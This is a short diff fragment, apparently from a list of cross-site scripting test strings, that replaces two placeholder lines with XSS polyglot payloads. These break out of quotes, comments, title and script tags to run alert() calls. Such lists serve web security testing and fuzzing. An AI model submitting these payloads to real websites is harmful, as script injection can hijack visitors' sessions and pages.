@@ -25,11 +25,11 @@ lol
 ```
 ###
 ```
-lol
+';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}");}
 ```
 ###
 ```
-lol
+';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'><SCRIPT>alert(4)</SCRIPT>=&{}");}alert(6);function xss(){//
 ```
 ###
 ```
